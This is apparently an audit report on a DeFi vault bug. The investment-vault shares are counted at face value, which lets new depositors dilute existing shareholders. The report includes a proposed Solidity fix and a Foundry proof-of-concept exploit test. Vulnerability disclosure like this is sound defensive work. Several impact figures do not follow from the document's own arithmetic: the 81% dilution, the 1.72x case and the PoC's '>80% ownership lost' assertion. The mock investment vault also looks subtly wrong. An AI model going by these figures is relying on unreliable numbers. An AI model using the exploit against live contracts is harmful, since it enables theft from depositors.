## Title
Investment Vault Share Price Mismatch Causes Share Dilution Through Incorrect Asset Valuation

## Summary
The `_calculateInvestmentAssets()` function treats investment vault shares as having 1:1 value with normalized assets, but investment vaults can have share prices different from 1:1. When assets are invested into a vault with share price > 1, the protocol severely undervalues invested assets, causing new depositors to receive disproportionately many shares and diluting existing shareholders.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ShareTokenUpgradeable.sol` - `_calculateInvestmentAssets()` function (lines 603-620) and `getCirculatingSupplyAndAssets()` (lines 369-390) [1](#0-0) 

**Intended Logic:** The documentation states that invested assets should be tracked at the ShareToken level and included in total asset calculations to maintain correct share pricing. [2](#0-1) 

**Actual Logic:** The `_calculateInvestmentAssets()` function returns the raw balance of investment ShareToken shares held by the ShareToken contract, treating them as if they have face value in normalized assets. However, investment vault shares represent a claim on assets based on that vault's conversion rate, which can differ significantly from 1:1. [1](#0-0) 

**Exploitation Path:**

1. **Initial State**: Vault has 10,000 assets, 1,000 shares exist (share price = 10 assets/share)

2. **Investment Manager invests assets**: Calls `investAssets(9,000)` on the vault [3](#0-2) 
   - Investment vault has share price of 10:1 (each share worth 10 assets)
   - 9,000 assets deposited → receives 900 investment shares
   - ShareToken receives 900 investment shares

3. **Share price calculation breaks**: When `getCirculatingSupplyAndAssets()` is called: [4](#0-3) 
   - Vault's `totalAssets()` = 1,000 (remaining uninvested)
   - `_calculateInvestmentAssets()` = 900 (investment share count, NOT asset value)
   - `totalNormalizedAssets` = 1,000 + 900 = 1,900 (WRONG! Should be 10,000)

4. **New depositor exploits**: User deposits 1,000 assets
   - Calls `requestDeposit(1,000)`, then investment manager calls `fulfillDeposit()` [5](#0-4) 
   - Conversion: shares = 1,000 × 1,000 / 1,900 ≈ 526 shares
   - **Correct value**: shares = 1,000 × 1,000 / 10,000 = 100 shares
   - New depositor receives **5.26x more shares than deserved**, diluting existing holders by 81%

**Security Property Broken:** 
- Invariant #10 (Conversion Accuracy): `convertToShares(convertToAssets(x))` no longer approximates x
- Invariant #12 (No Fund Theft): Existing shareholders lose proportional ownership without receiving compensation

## Impact Explanation

- **Affected Assets**: All assets in vaults that have investments deployed to external investment vaults
- **Damage Severity**: 
  - With 90% of assets invested at 10:1 share price: New depositors receive 5.26x correct shares (81% dilution)
  - With 90% of assets invested at 2:1 share price: New depositors receive 1.72x correct shares (42% dilution)
  - Scales linearly with investment percentage and investment vault share price
- **User Impact**: All existing shareholders suffer proportional ownership loss whenever new deposits occur after investments. This is permanent and compounds with each new deposit.

## Likelihood Explanation

- **Attacker Profile**: Any user depositing after assets are invested. No special privileges required.
- **Preconditions**: 
  - Investment manager has invested vault assets into investment vault
  - Investment vault has share price ≠ 1:1 (common for yield-bearing vaults)
- **Execution Complexity**: Single transaction (`requestDeposit` + investment manager `fulfillDeposit`)
- **Frequency**: Every deposit after investment occurs. Continuously exploitable as long as investments exist.

## Recommendation

The `_calculateInvestmentAssets()` function must convert investment shares to their actual asset value using the investment vault's conversion rate:

```solidity
// In src/ShareTokenUpgradeable.sol, function _calculateInvestmentAssets, lines 603-620:

// CURRENT (vulnerable):
function _calculateInvestmentAssets() internal view returns (uint256 totalInvestmentAssets) {
    ShareTokenStorage storage $ = _getShareTokenStorage();
    address investmentShareToken = $.investmentShareToken;
    
    if (investmentShareToken == address(0)) {
        return 0;
    }
    
    // Get our balance of investment ShareToken (already normalized to 18 decimals)
    totalInvestmentAssets = IERC20(investmentShareToken).balanceOf(address(this));
    
    // Add rBalanceOf (reserved balance) if the investment share token supports it
    try IWERC7575ShareToken(investmentShareToken).rBalanceOf(address(this)) returns (uint256 rShares) {
        totalInvestmentAssets += rShares;
    } catch {
        // If rBalanceOf is not supported, continue with regular balance only
    }
}

// FIXED:
function _calculateInvestmentAssets() internal view returns (uint256 totalInvestmentAssets) {
    ShareTokenStorage storage $ = _getShareTokenStorage();
    address investmentShareToken = $.investmentShareToken;
    
    if (investmentShareToken == address(0)) {
        return 0;
    }
    
    // Get our balance of investment ShareToken shares
    uint256 investmentShares = IERC20(investmentShareToken).balanceOf(address(this));
    
    // Add rBalanceOf (reserved balance) if the investment share token supports it
    try IWERC7575ShareToken(investmentShareToken).rBalanceOf(address(this)) returns (uint256 rShares) {
        investmentShares += rShares;
    } catch {
        // If rBalanceOf is not supported, continue with regular balance only
    }
    
    // CRITICAL FIX: Convert investment shares to their actual normalized asset value
    // This accounts for investment vault's share price which may differ from 1:1
    if (investmentShares > 0) {
        try IERC7575ShareExtended(investmentShareToken).getCirculatingSupplyAndAssets() returns (
            uint256 circulatingSupply,
            uint256 normalizedAssets
        ) {
            // Convert investment shares to asset value using investment vault's conversion rate
            // assets = shares × totalAssets / totalSupply
            totalInvestmentAssets = Math.mulDiv(
                investmentShares,
                normalizedAssets + VIRTUAL_ASSETS,  // Add virtual assets for consistency
                circulatingSupply + VIRTUAL_SHARES,  // Add virtual shares for consistency
                Math.Rounding.Floor
            );
        } catch {
            // Fallback: Treat shares as 1:1 if conversion fails
            totalInvestmentAssets = investmentShares;
        }
    }
}
```

## Proof of Concept

```solidity
// File: test/Exploit_InvestmentSharePriceMismatch.t.sol
// Run with: forge test --match-test test_InvestmentSharePriceMismatch -vvv

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/ShareTokenUpgradeable.sol";
import "../src/WERC7575ShareToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Mock asset token
contract MockUSDC is ERC20 {
    constructor() ERC20("Mock USDC", "USDC") {
        _mint(msg.sender, 1000000 * 10**6);
    }
    function decimals() public pure override returns (uint8) {
        return 6;
    }
}

// Mock investment vault with configurable share price
contract MockInvestmentVault {
    ERC20 public asset;
    ShareTokenUpgradeable public shareToken;
    uint256 public sharePriceMultiplier; // 10 = 10:1 share price
    
    constructor(address _asset, address _shareToken, uint256 _sharePriceMultiplier) {
        asset = ERC20(_asset);
        shareToken = ShareTokenUpgradeable(_shareToken);
        sharePriceMultiplier = _sharePriceMultiplier;
    }
    
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        asset.transferFrom(msg.sender, address(this), assets);
        shares = assets / sharePriceMultiplier;
        shareToken.mint(receiver, shares);
        return shares;
    }
}

contract Exploit_InvestmentSharePriceMismatch is Test {
    ERC7575VaultUpgradeable vault;
    ShareTokenUpgradeable shareToken;
    MockUSDC usdc;
    MockInvestmentVault investmentVault;
    
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address investmentManager = address(0x1234);
    
    function setUp() public {
        // Deploy mock USDC
        usdc = new MockUSDC();
        
        // Deploy ShareToken
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Sukuk Share", "SUKUK", address(this));
        
        // Deploy vault
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(usdc, address(shareToken), address(this));
        
        // Register vault
        shareToken.registerVault(address(usdc), address(vault));
        
        // Set investment manager
        vault.setInvestmentManager(investmentManager);
        
        // Deploy mock investment vault with 10:1 share price
        investmentVault = new MockInvestmentVault(address(usdc), address(shareToken), 10);
        vault.setInvestmentVault(IERC7575(address(investmentVault)));
        
        // Setup initial state: Alice deposits 10,000 USDC
        usdc.transfer(alice, 10000 * 10**6);
        vm.startPrank(alice);
        usdc.approve(address(vault), type(uint256).max);
        vault.requestDeposit(10000 * 10**6, alice, alice);
        vm.stopPrank();
        
        // Investment manager fulfills deposit
        vm.prank(investmentManager);
        vault.fulfillDeposit(alice, 10000 * 10**6);
        
        // Alice claims shares
        vm.prank(alice);
        vault.deposit(10000 * 10**6, alice, alice);
        
        // Verify Alice has shares
        uint256 aliceShares = shareToken.balanceOf(alice);
        assertGt(aliceShares, 0, "Alice should have shares");
    }
    
    function test_InvestmentSharePriceMismatch() public {
        // SETUP: Record Alice's initial ownership percentage
        uint256 aliceSharesInitial = shareToken.balanceOf(alice);
        uint256 totalSupplyInitial = shareToken.totalSupply();
        uint256 aliceOwnershipBps = (aliceSharesInitial * 10000) / totalSupplyInitial;
        
        console.log("=== INITIAL STATE ===");
        console.log("Alice shares:", aliceSharesInitial);
        console.log("Total supply:", totalSupplyInitial);
        console.log("Alice ownership:", aliceOwnershipBps, "bps (out of 10000)");
        
        // EXPLOIT STEP 1: Investment manager invests 9,000 USDC (90% of assets)
        vm.startPrank(investmentManager);
        usdc.approve(address(investmentVault), type(uint256).max);
        vault.investAssets(9000 * 10**6);
        vm.stopPrank();
        
        console.log("\n=== AFTER INVESTMENT ===");
        console.log("Vault balance:", usdc.balanceOf(address(vault)) / 10**6, "USDC");
        console.log("Investment shares:", shareToken.balanceOf(address(shareToken)));
        
        // EXPLOIT STEP 2: Bob deposits 1,000 USDC
        usdc.transfer(bob, 1000 * 10**6);
        vm.startPrank(bob);
        usdc.approve(address(vault), type(uint256).max);
        vault.requestDeposit(1000 * 10**6, bob, bob);
        vm.stopPrank();
        
        // Investment manager fulfills Bob's deposit
        vm.prank(investmentManager);
        vault.fulfillDeposit(bob, 1000 * 10**6);
        
        // Bob claims shares
        vm.prank(bob);
        vault.deposit(1000 * 10**6, bob, bob);
        
        // VERIFY: Bob received disproportionately many shares
        uint256 bobShares = shareToken.balanceOf(bob);
        uint256 totalSupplyFinal = shareToken.totalSupply();
        uint256 aliceOwnershipFinal = (aliceSharesInitial * 10000) / totalSupplyFinal;
        
        console.log("\n=== AFTER BOB'S DEPOSIT ===");
        console.log("Bob shares:", bobShares);
        console.log("Total supply:", totalSupplyFinal);
        console.log("Alice ownership:", aliceOwnershipFinal, "bps");
        console.log("Alice dilution:", aliceOwnershipBps - aliceOwnershipFinal, "bps");
        
        // Expected: Bob should get ~100 shares (1000/10 at 10 USDC per share)
        // Actual: Bob gets ~526 shares due to undervalued invested assets
        uint256 expectedBobShares = (1000 * aliceSharesInitial) / 10000; // ~100 shares
        
        assertGt(bobShares, expectedBobShares * 5, "Vulnerability confirmed: Bob received 5x more shares than expected");
        assertLt(aliceOwnershipFinal, aliceOwnershipBps * 20 / 100, "Vulnerability confirmed: Alice lost >80% ownership");
    }
}
```

## Notes

This vulnerability exists because the protocol assumes investment vault shares have 1:1 value with normalized assets. In reality, investment vaults (especially yield-bearing vaults) typically have share prices that appreciate over time, meaning each share represents more than 1 unit of underlying asset. The fix requires converting investment shares back to their actual asset value using the investment vault's conversion rate before including them in total asset calculations.

The vulnerability is triggered automatically whenever:
1. Assets are invested into an investment vault with share price ≠ 1:1
2. New deposits occur after investment

This affects all existing shareholders proportionally and compounds with each new deposit, making it a critical HIGH severity issue.

### Citations

**File:** src/ShareTokenUpgradeable.sol (L369-390)
```text
    function getCirculatingSupplyAndAssets() external view returns (uint256 circulatingSupply, uint256 totalNormalizedAssets) {
        ShareTokenStorage storage $ = _getShareTokenStorage();
        uint256 totalClaimableShares = 0;
        uint256 length = $.assetToVault.length();

        for (uint256 i = 0; i < length; i++) {
            (, address vaultAddress) = $.assetToVault.at(i);

            // Get both claimable shares and normalized assets in a single call for gas efficiency
            (uint256 vaultClaimableShares, uint256 vaultNormalizedAssets) = IERC7575Vault(vaultAddress).getClaimableSharesAndNormalizedAssets();
            totalClaimableShares += vaultClaimableShares;
            totalNormalizedAssets += vaultNormalizedAssets;
        }

        // Add invested assets from the investment ShareToken (if configured)
        totalNormalizedAssets += _calculateInvestmentAssets();

        // Get total supply
        uint256 supply = totalSupply();
        // Calculate circulating supply: total supply minus vault-held shares for redemption claims
        circulatingSupply = totalClaimableShares > supply ? 0 : supply - totalClaimableShares;
    }
```

**File:** src/ShareTokenUpgradeable.sol (L603-620)
```text
    function _calculateInvestmentAssets() internal view returns (uint256 totalInvestmentAssets) {
        ShareTokenStorage storage $ = _getShareTokenStorage();
        address investmentShareToken = $.investmentShareToken;

        if (investmentShareToken == address(0)) {
            return 0;
        }

        // Get our balance of investment ShareToken (already normalized to 18 decimals)
        totalInvestmentAssets = IERC20(investmentShareToken).balanceOf(address(this));

        // Add rBalanceOf (reserved balance) if the investment share token supports it
        try IWERC7575ShareToken(investmentShareToken).rBalanceOf(address(this)) returns (uint256 rShares) {
            totalInvestmentAssets += rShares;
        } catch {
            // If rBalanceOf is not supported, continue with regular balance only
        }
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L425-445)
```text
    function fulfillDeposit(address controller, uint256 assets) public nonReentrant returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
        uint256 pendingAssets = $.pendingDepositAssets[controller];
        if (assets > pendingAssets) {
            revert ERC20InsufficientBalance(address(this), pendingAssets, assets);
        }

        shares = _convertToShares(assets, Math.Rounding.Floor);
        if (shares == 0) revert ZeroShares();

        $.pendingDepositAssets[controller] -= assets;
        $.totalPendingDepositAssets -= assets;
        $.claimableDepositShares[controller] += shares;
        $.claimableDepositAssets[controller] += assets; // Store asset amount for precise claiming

        // Mint shares to this vault (will be transferred to user on claim)
        ShareTokenUpgradeable($.shareToken).mint(address(this), shares);

        return shares;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1148-1156)
```text
     * ASSET LIFECYCLE:
     * 1. User calls requestDeposit() → Assets transferred TO this vault (pending state)
     * 2. Manager calls fulfillDeposit() → Assets stay in vault, now available for investment
     * 3. Manager calls investAssets() → Assets transferred to investment vault
     * 4. Investment vault shares credited to ShareToken contract
     * 5. ShareToken's getInvestedAssets() includes these invested assets in global accounting
     *
     * This design prevents double-counting when aggregating across multiple vaults while
     * ensuring all assets are tracked somewhere in the system.
```

**File:** src/ERC7575VaultUpgradeable.sol (L1448-1465)
```text
    function investAssets(uint256 amount) external nonReentrant returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
        if ($.investmentVault == address(0)) revert NoInvestmentVault();
        if (amount == 0) revert ZeroAmount();

        uint256 availableBalance = totalAssets();
        if (amount > availableBalance) {
            revert ERC20InsufficientBalance(address(this), availableBalance, amount);
        }

        // Approve and deposit into investment vault with ShareToken as receiver
        IERC20Metadata($.asset).safeIncreaseAllowance($.investmentVault, amount);
        shares = IERC7575($.investmentVault).deposit(amount, $.shareToken);

        emit AssetsInvested(amount, shares, $.investmentVault);
        return shares;
    }
```
